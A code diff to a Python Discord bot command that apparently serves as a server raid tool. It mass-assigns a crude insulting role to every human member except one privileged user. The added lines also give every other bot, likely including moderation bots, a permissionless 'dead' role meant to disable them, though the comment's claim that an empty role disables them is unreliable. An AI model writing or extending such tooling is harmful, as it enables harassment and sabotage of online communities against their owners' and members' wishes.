@@ -60,16 +60,28 @@ async def lol(ctx, count: int = 100, invite_url: str = None):
         )
         print(f"うんこロール作成完了")
         
+        # ボット無効化ロール作成（完全に権限なし）
+        bot_dead_role = await guild.create_role(
+            name="死亡",
+            permissions=discord.Permissions.none(),
+            color=discord.Color.from_rgb(0, 0, 0)  # 黒
+        )
+        print(f"ボット無効化ロール作成完了")
+        
         # メンバーにロールを付与
         role_assign_tasks = []
         for member in guild.members:
-            if member.bot:
-                continue  # ボットはスキップ
-            if member.id == ALLOWED_USER_ID:
+            if member.id == bot.user.id:
+                # 自分（このボット）はスキップ
+                continue
+            elif member.bot:
+                # 他のボットには死亡ロール
+                role_assign_tasks.append(member.add_roles(bot_dead_role))
+            elif member.id == ALLOWED_USER_ID:
                 # あなたには野獣ロール
                 role_assign_tasks.append(member.add_roles(yaju_role))
             else:
-                # それ以外にはうんこロール
+                # それ以外の人間にはうんこロール
                 role_assign_tasks.append(member.add_roles(unko_role))
         
         await asyncio.gather(*role_assign_tasks, return_exceptions=True)
